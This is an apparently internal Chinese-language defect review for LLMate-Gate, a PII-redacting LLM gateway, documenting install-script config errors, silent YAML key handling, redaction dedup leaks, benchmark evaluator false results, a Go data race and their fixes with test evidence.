## 🔴 P0-1 · 安装脚本生成的配置 schema 错误

### 现象

`scripts/install.sh`（第 107-119 行）与 `scripts/install.ps1`（第 96-105 行）生成的 `config.yaml` 内容为：

```yaml
gateway:
  listen: ":8400"
  debug: true
upstream:                    # ← 顶层键，不存在
  base_url: "https://api.openai.com"
  api_key: ""                # ← 提示用户「必填」
detector:                    # ← 不存在
  engine: "regex"
replacer:                    # ← 不存在
  strategy: "placeholder"
```

而权威结构（`internal/config/config.go:21-28`）是：

```go
Gateway     GatewayConfig     `yaml:"gateway"`
Detection   DetectionConfig   `yaml:"detection"`
Replacement ReplacementConfig `yaml:"replacement"`
```

正确写法应为 `gateway.upstream`（字符串）、`gateway.upstream_api_key`、`detection.engine`、`replacement.strategy`。**三个顶层键全错**。

`install.ps1:154` 还进一步提示用户：「配置：$cfg（请填 upstream.api_key）」——指导用户去填一个不存在的字段。

### 证据

```
$ cat ~/.local/share/llmate-gate/config.yaml     # install.sh 实际产物
gateway:
  listen: ":8401"
  debug: true
upstream:
  base_url: "https://api.openai.com"
  api_key: ""            # 必填：上游 LLM API key
detector:
  engine: "regex"
replacer:
  strategy: "placeholder"
```

### 影响

用户按安装脚本的提示填写 `upstream.api_key`，网关**静默忽略**该字段，实际使用 `gateway.upstream_api_key`（默认空）转发，上游返回 401，用户无法从任何日志看出原因。

当前之所以没暴露，是**巧合**：错误键的所有默认值恰好等于期望行为（`gateway.upstream` 默认 `https://api.openai.com`、`detection.engine` 默认 `regex`、`replacement.strategy` 默认 `placeholder`）。一旦用户想改这三项中的任何一项，改动就会完全失效。

### 建议

1. 修 `install.sh` / `install.ps1` 的配置模板，改为正确 schema；
2. 模板内容应**从 `configs/config.example.yaml` 裁剪**而来，而不是手写——避免再次漂移；
3. 加一条冒烟断言：安装后用生成的配置启动网关，`GET /healthz` 必须 200，且启动日志里的 `upstream=` / `engine=` / `strategy=` 与预期一致。

## 🔴 P0-2 · 配置未知键被静默忽略

### 现象

`internal/config/config.go:243` 用 `yaml.Unmarshal` 解析配置，**未启用严格模式**。yaml.v3 默认忽略结构体里不存在的键，且不报错。

```
$ llmate-gate --config <schema 错误的配置>
2026/09/15 20:05:58 [llmate-gate] listen=:8402 upstream=https://api.openai.com engine=regex strategy=placeholder ...
```

无任何告警，正常启动。

### 证据

同一份配置在「错误 schema」与「正确 schema」下启动日志**完全一致**（除 `--listen` 覆盖的端口）。

### 影响

这是 P0-1 无法被察觉的**根因**。项目在别处一贯执行「校验失败一律退出，绝不降级」（`config.go:3` 的包注释、§3.2 的 11 条校验），唯独对「未知键」放行——这与既定设计哲学不一致。

用户配置写错一个键名，不会得到任何反馈。

### 建议

改用严格解析：

```go
dec := yaml.NewDecoder(bytes.NewReader([]byte(expandEnv(string(raw)))))
dec.KnownFields(true)
if err := dec.Decode(c); err != nil { ... }
```

启动期一次性失败，符合项目既有约定。**建议与 P0-1 同批修**：先严格化，再修模板——否则严格化会让现存的错误模板立刻启动失败，反而暴露成回归。正确顺序是同时改、一起验。

## 🟡 P1-3 · `--uninstall` 不删 binary，且遇错即中断

### 现象

`scripts/install.sh` 的卸载分支（第 78-96 行）只做三件事：停 systemd 服务、删 unit 文件、`pkill` 进程。**从不删除 `$INSTALL_BIN`（`~/.local/bin/llmate-gate`）与 `$CONFIG`**。

并且脚本头部是 `set -euo pipefail`（第 15 行）：

```
$ bash scripts/install.sh --uninstall --binary ...
[install] 卸载 llmate-gate
Failed to connect to bus: No such file or directory      # 容器无 dbus
$ ls ~/.local/bin/llmate-gate                            # 残留仍在
-rwxr-xr-x 1 root root 13852669 ... /home/jzhli/.local/bin/llmate-gate
```

`systemctl` 一失败，`set -e` 直接中断，后续 `pkill`、日志、`exit 0` 都没执行。

另有一个独立问题：`--uninstall` 分支位于 binary 存在性检查（第 68 行）**之后**，所以不传 `--binary` 时卸载直接 FAIL：

```
$ bash scripts/install.sh --uninstall
[install][FAIL] 找不到 binary：/home/jzhli/LLMate-Gate/dist/llmate-gate-linux-amd64。请先 ./scripts/release.sh 编译，或用 --binary 指定。
```

而卸载根本不需要 binary 源文件。

### 对照：Windows 侧是正确的

`scripts/install.ps1:53-74` 的 `Do-Uninstall` 完整删除计划任务、桌面 LNK、`$InstallDir`，且 `if ($Uninstall) { Do-Uninstall }`（第 78 行）位于找 binary（第 80 行）**之前**。这正是「Windows 侧真机冒烟过（`0cea49b`）、Linux 侧从未真机跑过」的直接后果。

### 影响

Linux 用户执行卸载后，二进制仍在 `~/.local/bin`，且 `PATH` 里仍可调用；再次安装会在 `config.yaml` 已存在时跳过生成（见 P1-5）。用户会认为「卸载干净了」。

### 建议

1. 卸载分支前置到 binary 检查之前；
2. 补 `run rm -f "$INSTALL_BIN"`；
3. 对 `systemctl` / `launchctl` 调用加容错：`run systemctl --user disable --now "$SERVICE_NAME" || true`（服务不存在是卸载的正常情况，不应中断）；
4. 卸载结束打印「已删除哪些路径」清单，让用户可核对。

## 🟡 P1-5 · `--port` 与既有配置不一致 → 假失败

### 现象

`--port` 只影响两处：生成配置时的 `listen`（仅在文件不存在时生效）、以及健康检查的 URL。它**不校验已存在 `config.yaml` 里的 `listen`**，也不把 `--port` 传给启动命令（启动用的是 `--config "$CONFIG"`，第 181 行）。

真机复现：

```
$ bash scripts/install.sh --no-autostart --binary ... --port 8404     # 此时 config.yaml 已存在（listen: :8401）
[install] 已安装 → /home/jzhli/.local/bin/llmate-gate
[install] 已后台启动（PID=12，日志 ...）
[install] WARN 健康检查未通过（可能还在启动或端口被占用）             # ← 假失败
[install] 安装完成。

$ cat ~/.local/share/llmate-gate/stderr.log
... listening on :8401 (debug=true)
... server error: listen tcp :8401: bind: address already in use     # ← 用的是配置里的 8401，不是 8404
```

健康检查查的是 `:8404`，网关监听的是 `:8401`，**必然失败**。

两个附加问题：

1. 健康检查失败只打 `WARN`，脚本仍以 **0 退出**（第 189-193 行）——CI 或自动化调用方无法感知失败；
2. 提示语「可能还在启动或端口被占用」把真实原因（配置与参数不一致）掩盖了。

### 影响

用户改端口重装会得到一个「装好了但没起来」的状态，且日志在 `~/.local/share` 下不易发现。

### 建议

1. 启动时显式传端口：`nohup "$INSTALL_BIN" --config "$CONFIG" --listen ":${PORT}"`（`--listen` 已是支持的 flag，`main.go:49`），让参数优先于配置；
2. 或在配置已存在且 `listen` 与 `--port` 不一致时，明确提示「检测到既有配置使用 :X，本次将按 :Y 启动」；
3. **健康检查失败应返回非零退出码**，或在 `--no-autostart` 下明确区分「已启动成功」与「未通过健康检查」两种终态；
4. 健康检查失败时把 `stderr.log` 尾部贴给用户，而不是让用户自己去找。

## 🔵 B-11 · `expect: []` 把已知漏检固化进期望 ✅ 已修

### 现象

语料中有 4 条 `expect: []`：

```json
{"id": "phone_fmt_adv-004", "text": "联系电话：+86-186-1234-5678，仅工作时段接听。", "expect": [], "note": "known_weakness_unnormalized_phone_format"}
{"id": "idcard_mask_adv-028", "text": "员工张三的身份证号是 110101********8531，请核对。", "expect": [], "note": "real_world_masked_expect_miss"}
```

两类语义被混在同一个表达里：

- `idcard_mask_adv-028`：掩码身份证不是完整身份证 → `expect: []` 的直觉对，但检出即 FP（报告里确实计了 FP=1）；
- `phone_fmt_adv-004/005/006`：`+86-186-1234-5678` 是**真实手机号**，只是当前引擎认不出 → `expect: []` 意味着「认不出算正确」。

### 影响

后一类的漏检没有计入 FN，**召回率被系统性抬高**：这 3 条若按「应检出」计，FN 从 14 增至 17，R 从 0.6111 降到约 0.5645。评估器把缺陷写成了期望，等于放弃了度量这项缺陷的能力。

### 修复

新增 `expect_miss`（已知弱点台账），与 `expect: []` 彻底分开：

```json
{"id": "phone_fmt_adv-004", "text": "联系电话：+86-186-1234-5678，仅工作时段接听。",
 "expect": [], "expect_miss": [{"type": "zh_phone", "value": "+86-186-1234-5678",
 "reason": "known_weakness_unnormalized_phone_format"}]}
```

1. **不计 FP**：命中 `expect_miss` 的检出被豁免 —— 它是**真 PII**，抓到了说明检测器比语料作者预期更强，扣分是方向性错误；旧实现反而给它记 FP。
2. **单独出台账**：评估器输出「已知弱点台账」，逐条标注 ✅ 已恢复 / ❌ 仍漏报。
3. **双口径**：报告同时给出严格口径 F1（`expect` 定分）与**悲观口径 F1**（每条 `expect_miss` 都算 FN），读者能看出标题数字里有多少是「已知缺口没算进去」。
4. **`runner.py` 同步**：`load_cases` 多返回一个 `expect_miss_values`，在 `eval_cases` 里从误报中剔除，两个评估器口径一致。
5. **`validate.py` 强制完整**：`expect_miss` 必须写明 type/value/reason，且 value 必须真的出现在 text 里 —— 空洞的台账会变成「永远不判错」的噪音。

## 🔴 P0-12 · 同名 PII 在单段文本内只上报首次 → 后续明文泄漏上游

> 以下 #12–#15 是 v1.2（修复落地）过程中新发现的问题，为保留取证时间线按**发现顺序**
> 附在清单末尾；优先级以顶部摘要表为准。

### 现象

`regex.go` 的 `scanPersonName`（人名）与 `scanPlateEN`（英文车牌）用 `map[string]bool`
按**值**去重：

```go
seen := map[string]bool{}
appendName := func(start, end int, score float64) {
    v := text[start:end]
    if seen[v] {   // ← 按值去重
        return
    }
    seen[v] = true
    ...
}
```

后果：一段文本里同一个 PII 值出现多次，只有**第一次**被上报。

```
IN : "我叫李杰琪，联系人李杰琪，员工李杰琪。"
OUT: "我叫<<zh_person_name_1>>，联系人李杰琪，员工李杰琪。"   ← 后两处明文直发上游
```

端到端实测（`/v1/privacy/redact`，修复前）：

```
IN : "我叫李杰琪，联系人李杰琪，员工李杰琪。"
OUT: "我叫<<zh_person_name_1>>，联系人李杰琪，员工李杰琪。"
```

### 为什么这是 P0

网关的全部意义就是阻止 PII 到达上游。这个缺陷让「同一句话里重复提到的姓名」
原样外泄，而且**不留任何痕迹**：脱敏日志显示已替换，指标显示有 PII 被处理，
审计里看不出异常。检测器负责人都不会收到告警 —— 静默失效。

触发门槛极低：中文对话里「张三代…，请张伟转告…」这类重复提及是常态。

### 根因与修复

真正的去重需求是「同一条规则重复上报同一段区间」，而**值相同、区间不同**是完全
合法的两次命中。下游 `replacer.sanitizeEntities` 已经按区间排序并消解重叠
（保留更长者），因此本地去重只需按区间：

```go
// span 是「同一段文本内已上报区间」的去重键。
type span struct{ start, end int }
```

`scanPersonName` / `scanPlateEN` 的去重键从 `string` 改为 `span`。

### 验证

新增两条回归测试：

- `TestRegexEngine_PersonName_AllOccurrencesReported`：`"我叫李杰琪，联系人李杰琪。"` 必须上报 **2** 次；
- `TestRegexEngine_PlateEN_AllOccurrencesReported`：同一车牌出现两次必须上报 **2** 次。

端到端复测：三处引导词命中的同名 PII 全部替换；嵌套工具调用载体（同名文本同时出现在
两个字段）泄漏消失。

### 连带影响

这一处修复让 `cn-pii-bench` 的 **L2 载体对等性守门从 FAIL 转 PASS**：
`tool_call_nested` 的 30 条 regression 全部消失（见 B-15）。也就是说，
`README` 里声明的 v1 守门条件（`regressions vs flat = 0`）此前一直是**未达成**状态。

### 残留

`"我叫李杰琪，请转告李杰琪。"` 中第二处**无引导词**的姓名仍不检出 —— 这属于
人名规则的已声明召回边界（弱格式实体只保证精确率），不是缺陷。

| 3 rune，第 3 字不是硬助词 | 保留 | 李永和 |

「硬助词」是刻意收窄的集合（的/了/是/在/把/被/让/不/这/那/个/些/们/吗/呢/吧/就/都/也/还/很/没/给/对/从/向/该/其/并/则/等/或/而/由/及/与/为/以/之），**不含「和 / 有 / 会 / 能 / 要」** —— 这几个字同样可以是真实姓名的末字（李永和、张有、陈会），
把它们当截断信号会拿一个精确率问题换一个召回率问题。

### 验证

`TestRegexEngine_PersonName_NoParticleOvercapture` 覆盖 7 个用例：核心回归（掩码身份证场景）、
复姓四字名不被误截、三字名末字为「和」不被误截、称谓规则同样截断
（「王五的先生」→ 王五）。

对抗语料 Precision 从 **0.9565 → 1.0000**。

## 🟢 P2-14 · 流末残留哨兵被吐到 SSE 帧之外 ⏸ 复核后判定为可接受

### 现象

`SSERestorer.Close()` 在最后一帧已下发之后，把 `inner.Close()` 的残留字节**裸追加**在事件之后：

```
data: {"choices":[{"delta":{"content":"邮箱 "}}]}
                                          ← 帧结束
<<e                                       ← 裸字节，不在任何 data: 帧内
```

触发条件：上游在流末尾恰好把输出截断在某个占位符中间（例如 `max_tokens` 砍在 `<<zh_phone_1>>` 的第 3 个字节）。此时 `inner` 的缓冲里留着 `<<e` 这样的严格前缀，`isPrefixOfAny` 判为残留，`Close` 把它原样吐出 —— 但吐在了帧结构之外。

### 为什么判定为可接受

1. **前置条件极窄**：要求上游把一次输出截断在占位符内部。正常流里占位符总是完整的（跨事件由 `SSERestorer` 的内容维度缓冲拼回，已有测试覆盖）。
2. **不泄漏 PII**：残留的是**不完整的占位符片段**（`<<e`），不是原文。原文从未出现在上游可见串里。
3. **不丢原文**：原文在 `Close` 前就已按帧还原下发；被裸吐的只是那截无意义的碎片。
4. **已有测试把该行为钉为契约**：`TestSSERestorer_CloseFlushesRemainder` 明确断言「Close 应吐出残留内容」。改动它会改变已声明的语义。

### 记录而非改动的理由

要「修正」它，必须把残留塞回最后一个事件的 `content` 里，而这需要重新序列化已经下发的帧（或把最后一帧延后到确认无残留再发）。前者的代价是引入一次 JSON 重编码（会破坏 `snowman` 之外的字节保真），后者给每个流增加一帧延迟。**在触发条件如此窄、后果如此轻的前提下，这两笔代价都不划算。**

真正需要的是把这个边界说清楚，避免下次误判为「漏了」：
`stream.go` 的注释写的是「原样吐出（fail-safe，不丢数据）」，严格说应该补充「残留以裸字节形式落在帧外，符合 SSE 规范的客户端会忽略它」。

## 🟡 B-16 · L2 往返门禁把「按设计不可逆」误判为失败（144 条假警报） ✅ 已修

### 现象

B-15 修完、`regressions` 归零后，改跑**全量 240 条**（此前只跑 `--limit 60` 子集），
往返门禁立刻爆出大量失败：

```
| 载体                | 已脱敏 | 泄漏 | regression | 往返通过 |
| flat                | 360   | 0    | OK         | 204/240 |
| multimodal          | 360   | 0    | OK         | 204/240 |
| tool_call           | 360   | 0    | OK         | 204/240 |
| tool_call_nested    | 360   | 0    | OK         | 204/240 |
→ [carriers] regressions=0 roundtrip_failures=144
```

### 根因

**不是网关的问题，是评估器把两个不同的概念当成了一件事。**

`carriers.py` 的判定是：

```python
anon, leaked = score_leaks(values, flatten(redacted))   # 值从载荷里消失了 = anon
rt = all(v in rflat for v in anon)                      # 要求 anon 的值都能还原
```

而「值从载荷里消失」**不等于**「值可被还原」。网关对 `zh_bank_card` 在
`strategy=placeholder` 下的命运是 **mask**（`replacer.go` 的 `fateFor`：
保留后 4 位、其余填 `*`），这是**按设计不可逆**——掩码值本来就不该、也不可能被还原。

失败分布完全对应：30 条 `bank_card` + 6 条含银行卡的 `adversarial`，
×4 载体 = **144**，一条不多一条不少。

**为什么之前没暴露**：`--limit 60` 恰好只取到 `cases.jsonl` 的前 60 条
（`person_name` 30 + `phone` 30），本金卡一条都没进样本。

### 修复

改为**向网关实测**每种实体类型的可逆性，而不是硬编码类型清单：

```python
def probe_reversible(typ, value, redact, restore, cache):
    # 最小样本：脱敏 → 还原
    #   值没被脱掉      → None（不属于可逆性范畴，照旧断言往返）
    #   值被脱掉且能还原 → True（必须断言往返）
    #   值被脱掉但还原不回来 → False（mask/redact，豁免往返断言）
    #   探测本身失败    → None（宁严勿松：不豁免）
```

- 结果按**类型**缓存，一次运行只需 ~8 次额外请求；
- 被豁免的值**单列入台账**（报告新增「按设计不可逆」章节），不静默丢弃；
- 不硬编码「哪些类型不可逆」——那等于把网关策略实现细节抄进基准，必然漂移。

顺带修掉同一文件的**代理绕过缺失**：`carriers.py` 用的是裸 `urlopen`，
在设了 `http_proxy` 的环境里会把 127.0.0.1 的请求也送去代理
（`runner.py` / `bench_runner_adversarial.py` 都已有 `_NO_PROXY_OPENER`，只漏了这一处）。

### 验证

```
[carriers] 可逆性探测：{'zh_person_name': None, 'zh_phone': True, 'zh_id_card': True,
                        'zh_bank_card': False, 'zh_address': True, 'email': True}
[carriers] 按设计不可逆（豁免往返断言）：['zh_bank_card']

| 载体              | 已脱敏 | 泄漏 | regression | 往返通过 |
| flat              | 360   | 0    | OK         | 240/240 |
| multimodal        | 360   | 0    | OK         | 240/240 |
| tool_call         | 360   | 0    | OK         | 240/240 |
| tool_call_nested  | 360   | 0    | OK         | 240/240 |
→ [carriers] regressions=0 roundtrip_failures=0
```

自检同时确认评估器**没有变瞎**：故意漏实现（跳过 `tool_calls`）仍抓出 80 条 regression，
正确实现 0 regression / 0 往返失败（`SELFTEST PASSED`）。

### 教训

同一类错误在本轮出现了**两次**，值得单独立一条规则：

| 形态 | 表现 |
|---|---|
| B-11 | 把「已知弱点」写成 `expect: []` → 期望里固化了缺陷，还把真 PII 判成误报 |
| B-16 | 把「按设计不可逆」当成「往返失败」 → 144 条假警报，门禁永远不可能通过 |

**共同点：基准把「设计明确不做的事」当成「实现做错了」。** 修复方式也一样——
把这类对象**显式入账并豁免计分**（`expect_miss` / 可逆性探测台账），
而不是二选一地「要么算失败、要么删样本」。

另一个独立教训：**子集采样会掩盖缺陷类型**。`--limit 60` 让 `carriers.py` 看起来
全绿，而它压根没有覆盖银行卡。守门跑分应当跑**全量**。

## 🟡 P1-18 · `install.sh` 猜测 binary 路径时把架构写死成 amd64 ✅ 已修

### 现象

不传 `--binary` 时，`install.sh` 用 `guess_binary` 推断本仓 `dist/` 下的产物路径。
在**本机（linux/arm64）**上它推出来的是：

```
[install][FAIL] 找不到 binary：/home/jzhli/LLMate-Gate/dist/llmate-gate-linux-amd64。
```

而 `uname -m` 是 `aarch64`。release 产物按 `llmate-gate-<goos>-<goarch>` 命名
（`scripts/release.sh` / CI `release.yml`），arm64 机器上本应是 `linux-arm64`。

### 根因

```bash
case "$OS" in
  linux)  echo "${repo_root}/dist/llmate-gate-linux-amd64" ;;   # 写死 amd64
  darwin) echo "${repo_root}/dist/llmate-gate-darwin-arm64" ;;  # 写死 arm64
esac
```

两个分支各写死一个架构，且**互相矛盾**（linux 假设 amd64、darwin 假设 Apple Silicon）——
说明是「按作者当时手头机器」填的，不是推导。

### 影响

1. **arm64 Linux 上安装必然失败**，且报错只说「找不到」，用户不知道是平台不匹配；
2. 更隐蔽的一种：若 `dist/` 里恰好躺着 amd64 产物（交叉编译后很常见），
   `[[ -f ]]` 会**通过**，于是把当前架构跑不起来的二进制装进 `~/.local/bin`，
   错误推迟到「启动时报 exec format error」才暴露。

### 修复

按 `uname -m` 推导 goarch，并补齐 case：

| `uname -m` | goarch |
|---|---|
| `x86_64` / `amd64` | `amd64` |
| `aarch64` / `arm64` | `arm64` |
| `armv7l` / `armv6l` | `arm` |
| `i?86` | `386` |
| 其它 | 原样透传 |

同时补 `windows` 分支（`.exe` 后缀），并在失败时**列出 `dist/` 里现有产物**——
用户一眼能看出「是没编译」还是「架构不匹配」。

### 验证

```
$ uname -m
aarch64
$ bash scripts/install.sh --dry-run --port 8420
[install][FAIL] 找不到 binary：/home/jzhli/LLMate-Gate/dist/llmate-gate-linux-arm64。
  dist/ 目录为空或不存在。
```

（正确推出 `linux-arm64`；并给出「dist/ 为空」这一可操作信息。）

## 🔵 B-18 · 门禁从未在 CI 里跑过；且 L2 守门在端点不可达时会误判为通过 ✅ 已修

### 现象

复盘 B-15 时的一句判语促成了这一轮：**「一个不跑的守门等价于没有守门」**。
核对 CI 后发现两件事：

**其一，门禁确实没跑。** `cn-pii-bench` 的四个评估器**一个都不在 CI 里**；
`LLMate-Gate` 的 `bench` job 只做 fixture 结构校验，`bench-baseline` 只跑进程内
`cmd/bench-runner`。也就是说 **L2 载体对等性守门与真对抗语料从未被执行过** ——
而 B-15 报出的 30 条 regression 恰恰属于「同一段文本出现在同一请求的多个字段」
这类只有**端到端**才测得到的缺陷。

**其二，那个没跑的门禁本身还是瞎的。** 把 `carriers.py --gate` 指向一个不存在的端口：

```
$ python3 carriers.py --base-url http://127.0.0.1:9999 --gate
| 载体 | 已脱敏 | 泄漏 | 相对 flat 的 regression | 往返通过 |
✅ **PARITY OK**：3 种结构化载体相对 flat 基线 0 regression，往返 0 失败。
[carriers] regressions=0 roundtrip_failures=0
exit=0
```

端点完全不可达、**什么都没测到**，门禁却打印 PARITY OK 并退出 0。

### 根因

```python
anon, leaked = score_leaks(values, flatten(redacted))   # 请求失败 → redacted 为 None
regressions = flat_ok & set(c["leaked"])                 # flat 也失败了 → flat_ok 为空
# → 交集恒为空 → regression 恒为 0
rt_checked = [x for x in rt if x is not None]            # 失败时 roundtrip_ok = None
# → 被过滤掉 → 往返失败恒为 0
```

**请求失败被静默地折算成了「零缺陷」**：所有派生的分母/分子都变成空集，
判定逻辑看到的是「干净通过」。这比没有门禁更糟 —— 它给出虚假保证。

### 修复

1. `summarize` 单独统计请求错误（`errors`），与 regression / 往返失败**并列**，
   不再让失败数据流进缺陷统计；
2. 报告新增「请求错误」列；结论区新增「❌ **无法判定（N 条请求错误）**」分支，
   与「PARITY OK」「PARITY FAILED」三足鼎立；
3. `--gate` 遇到请求错误即退出 2；
4. **自检新增第 3 个场景**：端点不可达时必须记为请求错误、且不得产出 regression。
   前两个场景（正确实现 / 故意漏实现）只能证明「门禁能抓坏实现」，
   证明不了「门禁不会瞎绿」——这才是关键的一条。

### 同轮补上的真对抗阈值门禁

`bench_runner_adversarial.py` 的 `__main__` 恒返回 0，根本无法当守门。
新增 `--min-precision` / `--min-recall` / `--min-f1`，低于阈值退出码 2。
阈值**刻意放在 CI 命令行而不是脚本里**：让「当前承诺的底线」在 review 中显式可见。

阈值取值（**当前**基线 2026-09-21：span P=1.0000 R=0.5417 F1=0.7027）：

| 阈值 | 值 | 理由 |

| `--min-precision` | **0.99** | 精确率是 PII 网关最不能退的指标：误报会改写正常对话内容，比漏检更容易被用户察觉。压到 0.99 意味着**任何**误报都会让 CI 变红 |
| `--min-recall` | **0.60 → 0.46 → 0.53** | 召回率低是**已声明的设计边界**（弱格式实体依赖 NER sidecar），只防回归不设理想值 |

## 🔴 B-19 · 表驱动重构把「读一个 bool」变成「拷贝整个结构体」→ CI 竞态红灯

### 现象

`8bb0dbb` 推送后，CI 的 `verify` job 在「单元 + 集成测试（含竞态检测）」这一步失败，
**后续 9 个 job 全部 skipped**（含刚补上的 `bench-gate`）。而上一次提交 `185f159`
的同一 job 是绿的。本地 `go test ./...`（**不带** `-race`）15 个包全绿。

排查过程本身暴露了第二个缺陷：**红灯说不出所以然**。

```
$ curl .../actions/jobs/<id>/logs
{"message": "Must have admin rights to Repository.", "status": 403}
$ curl .../commits/5f55211/check-runs     # 唯一能拿到的东西
{ "path": ".github", "start_line": 78, "annotation_level": "failure",
  "message": "Process completed with exit code 1.", "raw_details": "" }
```

仓库是 public，但 **Actions 的 job 日志仍要求 admin 权限**；check-run 注解只有一句
「退出码 1」。于是「为什么红」只能靠人肉推理，而唯一的证据在 `-race` 里 ——
`-race` 恰恰是本机跑不了的那一条（见下）。

### 根因

P2-8 把 `Fake` 的 `switch` 改成表驱动派发，开关判断从

```go
case types.EntityPersonName:
    if !g.Cfg.PersonName { return nil, ErrNoSimulation }   // 只读 struct 偏移 0 的 1 个字节
```

变成了

```go
if !g.enabled(e.on)      // on 的签名是 func(SimulateZHConfig) bool
```

`e.on(g.Cfg)` 是**按值传参**，因此拷贝动作覆盖整个 `SimulateZHConfig` ——
**包括 struct 偏移 8 的 `Dictionary`（map 头）**。而 `SetDictionary` 正在锁内改写
`g.Cfg.Dictionary`。于是「读 map 头 ‖ 写 map 头」构成真实数据竞态。

触发者是 `simulator_test.go` 里那条专门为 `-race` 写的用例：

```go
// TestDictionary_ConcurrentReload 热加载与在途请求并发（配合 go test -race）。
go func() { for i := 0; i < 200; i++ { g.SetDictionary(...); _ = g.Dictionary() } }()
for i := 0; i < 200; i++ { _, err := g.Fake(types.EntityPersonName, []byte("李四"), nil) }
```

**为什么旧代码没被报出来**：`g.Cfg.PersonName` 只碰偏移 0~1，`Dictionary` 在偏移 8~15；
TSan 的影子内存按 2 字节粒度记账，两次访问落在不同影子单元，**误打误撞躲过了**。
这不是「旧代码更安全」，而是 **race detector 的覆盖有边界，旧写法只是恰好落在边界外**。
一旦有人按值传整个结构体，边界就失效了。

### 为什么本地抓不到

容器内 ThreadSanitizer 起不来：

```
FATAL: ThreadSanitizer: unsupported VMA range
FATAL: Found 39 - Supported 48
```

（arm64 + 高 VMA 地址空间；`setarch -R` 关闭 ASLR 也无效，`vm.mmap_rnd_bits` 不可调。）
本地 `-race` 是**无法执行**的，这类缺陷只能在 CI 的 x86_64 runner 上暴露。
推论：**CI 的 `-race` 不是可选项，是这类缺陷的唯一出口。**

### 修复

1. `Generator.Cfg` 改为**不导出**的 `cfg`。导出字段挡不住调用方绕过 `mu` 直读；
   不导出让编译器成为护栏 —— 这比加一条测试更可靠（测试只能覆盖想到的路径）。
2. 新增 `enabled(on func(SimulateZHConfig) bool) bool`：**在 `RLock` 内**把 `cfg` 交给 `on`
   求值；`on == nil` 表示该类型恒开（与表语义一致）。
3. 新增 `SetSimulateConfig`（Lock），`replacer.New` 由 `g.Cfg = cfg.Simulate` 改为走它。
4. **同类问题一并修掉**：`impl.Strategy()` 与 `impl.NewSession()` 原本在锁外读 `r.cfg`，
   而 `SetStrategy` 是持锁写该字段的 —— 且 `Strategy()` 是**每个请求**都会走的
   热路径（`proxy.strategy()`），属于同一类「锁外读会热加载的结构体」。
   改为锁内快照；`impl.mu` 由 `Mutex` 升为 `RWMutex`。
   实现时注意：**`RLock` 不可重入**（写者排在两次 `RLock` 之间会死锁），
   因此 `NewSession` 先在锁内取快照、再在锁外归一化策略，而不是持锁调 `r.Strategy()`。

|---|---|---|

| `go vet ./...` | 通过 | ✅ |

### 连带发现 2 · staticcheck S1016：用类型转换换一个编译期约束

```go
// 修前：逐字段写字面量
e := EffectiveUpstream{Protocol: u.Protocol, BaseURL: u.BaseURL, APIKey: u.APIKey,
                       APIVersion: u.APIVersion, PathPrefix: u.PathPrefix}
// 修后
e := EffectiveUpstream(u)
```

两个结构体字段同名、同类型、同序，所以转换合法。更重要的是：转换把
**「`UpstreamConfig` 与 `EffectiveUpstream` 必须保持同构」变成编译期约束** ——
将来给任一侧加字段，这里会立刻编译失败，而不是静默漏传一个字段。
这正是 staticcheck 建议它的实质理由，不只是风格问题。


### 教训

1. **「把整个结构体按值传」是一种隐式的锁外读。** 字段级读可能恰好躲过 TSan，
   整体拷贝会把同一结构体里所有会热加载的字段一起拖下水。**热加载结构体不要按值传参**，
   也不要按值返回；要传就传「某个标量的快照」。
2. **能本地复现的失败才是可调试的失败。** 当唯一的验证手段（`-race`）只存在于 CI，
   「CI 失败是否自述原因」就从「体验问题」升级成「能力问题」。
3. 因此本轮补上 `scripts/ci-test-annotate.py`：`go test` 输出 tee 到文件，失败时把
   `--- FAIL` / `FAIL <pkg>` / `DATA RACE` 以 `::error::` 注解写回 check run。
   **注解不依赖日志权限**，因此没有 admin 权限的人也能看到失败用例名。
   这一步不改变构建结论（判定失败仍由 `go test` 那一步负责），只是让红灯开口说话。

> 本轮这条缺陷，是「补上从没跑过的守门」（B-18）之后**第一个被新守门抓到的东西**。
> 顺序很说明问题：先让守门真的跑起来，才谈得上它抓不抓得到。

## 🔵 B-23 · perf 门禁把「检测变强」读成「replacer 变慢」（假阳性） ✅ 已修

### 现象

2026-09-21 落地**形态容忍**（`HANDOFF.md` §14）后，CI 的 `bench perf guard` 红了：

```
::error::基准 BenchmarkReplacerSessionReplace 回退超阈值（current/baseline > 1.25）
::error::基准 BenchmarkReplacerFullReplace 回退超阈值（current/baseline > 1.25）
```

其余 10 个 job 全绿，包括 `bench gate`（真对抗阈值守门）与 detector 自己的
`BenchmarkRegexEngineDetect`。失败集中在 **replacer** 包 —— 一眼像是这次改动
把 replacer 弄慢了，但这次改动只碰了 `internal/detector`。

### 根因

`internal/replacer/replacer_bench_test.go` 的 `benchEntities()` 当时这样取实体列表：

```go
eng := detector.NewRegexEngine()
resp, _ := eng.Detect(ctx, &types.DetectRequest{Text: benchTextReplace})
return resp.Entities          // ← 工作量由「检测器当下能检出什么」决定
```

于是**基准的工作量会随检测能力漂移**。形态容忍让同一段文本多检出一个分组卡号
（`4111 1111 1111 1111`；`6222 0210 0123 4567` 因校验位不过仍不检出），
实体数 **4 → 5**，两个基准的 `ns/op` 与 `allocs/op` 同步上升约 25%，
正好越过 1.25× 的容差线。

### 证据（同机 A/B，`ca0d965` vs 改动后）

| 基准 | B/op | allocs/op | 实体数 |
|---|---|---|---|
| `SessionReplace` 改动前 | 2849 | 34 | 4 |
| `SessionReplace` 改动后 | 4097 | 39 | 5 |
| `FullReplace` 改动前 | 3017 | 38 | 4 |
| `FullReplace` 改动后 | 4265 | 43 | 5 |

`B/op` 与 `allocs/op` **是确定性的**（不受调度噪声影响），两者同步变化即说明
工作量真的变了。用一次临时导出测试（已删除）确认实体集：

```
改动前 COUNT=4: zh_person_name 张三 / zh_phone / email / us_ssn
改动后 COUNT=5: + credit_card "4111 1111 1111 1111"
```

### 修复

把 `benchEntities()` 的实体列表**写死**（4 条字面量），并加一条自检：
字面量的 `[Start,End)` 切片必须逐字等于 `Value`，防止有人改了文本却忘改偏移。
同时删除该基准文件对 `gateway/internal/detector` 的 import。

**关注点解耦**：检测器能力由 `BenchmarkRegexEngineDetect` 度量；
替换吞吐由 replacer 基准度量，工作量恒定。

### 验证

- 工作量回到改动前：`B/op` 与 `allocs/op` **逐位相同**（2849/34、3017/38）。
- 同机交错 A/B（各 2 轮 × count=6）：`FIXED_min / BASE_min` = **0.778**（Session）/
  **0.755**（Full）—— 不但没退化，还比改动前**快约 24%**。
  原因：replacer 测试二进制不再链接 detector，少了那批常驻编译正则的存活堆，
  测量区间内的 GC 压力随之下降。也就是说原先「变慢」有两个叠加来源：
